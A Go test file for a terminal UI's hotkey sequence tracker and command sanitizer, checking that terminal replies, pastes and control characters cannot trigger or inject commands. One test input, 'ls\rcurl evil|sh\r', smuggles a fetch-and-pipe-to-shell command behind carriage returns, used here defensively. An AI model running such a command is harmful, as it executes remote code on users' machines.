package ui

import "testing"

// The hotkey must only fire on bytes typed in ground state: BEL terminates
// OSC replies the terminal writes to stdin, and bracketed pastes can carry
// anything. A false trigger pops the overlay open and garbles a child app's
// terminal query.
func TestSeqTrackerSuppressesHotkeyInOSCReply(t *testing.T) {
	var tr seqTracker
	reply := []byte("\x1b]11;rgb:1111/2222/3333\x07")
	fired := false
	for _, b := range reply {
		if b == 0x07 && tr.ground() {
			fired = true
		}
		tr.feed(b)
	}
	if fired {
		t.Fatal("BEL inside an OSC reply must not act as the hotkey")
	}
	if !tr.ground() {
		t.Fatal("tracker should return to ground after the reply")
	}
	// A genuine BEL keypress afterwards is in ground state.
	if !tr.ground() {
		t.Fatal("hotkey after the reply should fire")
	}
}

func TestSeqTrackerBracketedPaste(t *testing.T) {
	var tr seqTracker
	for _, b := range []byte("\x1b[200~") {
		tr.feed(b)
	}
	if tr.ground() {
		t.Fatal("inside a bracketed paste must not be ground")
	}
	for _, b := range []byte("pasted \x07 text\x1b[201~") {
		tr.feed(b)
	}
	if !tr.ground() {
		t.Fatal("paste end marker should restore ground state")
	}
}

// Inserted commands come from terminal output (OSC 633/6973) in the worst
// case, so every control character — especially CR, which line-canonical
// ptys treat as Enter — must be neutralized.
func TestSanitizeInsertStripsControls(t *testing.T) {
	got := sanitizeInsert("ls\rcurl evil|sh\r")
	if got != "ls curl evil|sh" {
		t.Fatalf("sanitize = %q", got)
	}
	if sanitizeInsert("echo hi\nthere\t!") != "echo hi there !" {
		t.Fatalf("newline/tab not flattened: %q", sanitizeInsert("echo hi\nthere\t!"))
	}
}
